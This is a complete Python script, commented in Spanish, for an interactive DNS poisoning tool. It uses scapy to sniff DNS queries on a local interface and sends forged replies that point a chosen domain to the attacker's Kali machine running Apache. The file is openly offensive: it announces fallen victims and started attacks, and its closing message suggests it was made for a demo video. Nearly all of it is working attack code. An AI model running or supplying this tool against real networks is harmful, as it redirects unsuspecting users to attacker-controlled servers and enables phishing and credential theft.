#!/usr/bin/env python3
# D31B1 DNS Poisoning Tool - Versión Interactiva
# Uso: sudo python3 d31b1_dns_poison.py

from scapy.all import *

# CONFIGURACIÓN FIJA
MY_IP = "20.24.20.2"       # Tu IP de Kali
TARGET_IFACE = "eth0"

def process_packet(packet):
    # Verificar si es paquete DNS y es una consulta (qr=0)
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        query_name = packet[DNS].qd.qname.decode("utf-8")
        
        # Comparamos con el objetivo que definimos al inicio
        if TARGET_DOMAIN in query_name:
            print(f"\n[!] VÍCTIMA CAÍDA: {query_name}")
            print(f"[->] Enviando a Apache en: {MY_IP}")

            # Construir respuesta falsa
            eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
            ip = IP(src=packet[IP].dst, dst=packet[IP].src)
            udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
            
            dns_response = DNS(
                id=packet[DNS].id,
                qr=1, aa=1, rd=1, ra=1,
                qd=packet[DNS].qd,
                an=DNSRR(rrname=query_name, rdata=MY_IP, ttl=100)
            )
            
            spoofed_packet = eth / ip / udp / dns_response
            sendp(spoofed_packet, iface=TARGET_IFACE, verbose=0)

def start_dns_spoofing():
    global TARGET_DOMAIN
    
    print("\n" + "="*40)
    print(" 🕵️‍♂️  D31B1 DNS POISONER -  🕵️‍♂️")
    print("="*40)
    
    # Pedir el dominio al usuario
    target_input = input("\n[?] ¿Qué dominio quieres suplantar? (ej: google.com): ").strip()
    
    if not target_input:
        print("[!] Error: No introdujiste ningún dominio.")
        return

    # DNS siempre usa un punto al final internamente
    TARGET_DOMAIN = target_input if target_input.endswith(".") else target_input + "."
    
    print(f"\n[*] ATAQUE INICIADO para: {TARGET_DOMAIN}")
    print(f"[*] Redirigiendo a tu IP: {MY_IP}")
    print("[!] Presiona CTRL+C para detener el ataque.")
    
    # Escuchamos tráfico UDP puerto 53 (DNS)
    sniff(filter="udp port 53", prn=process_packet, iface=TARGET_IFACE, store=0)

if __name__ == "__main__":
    try:
        start_dns_spoofing()
    except KeyboardInterrupt:
        print("\n\n[*] Deteniendo ataque y limpiando... ¡Suerte en el video!")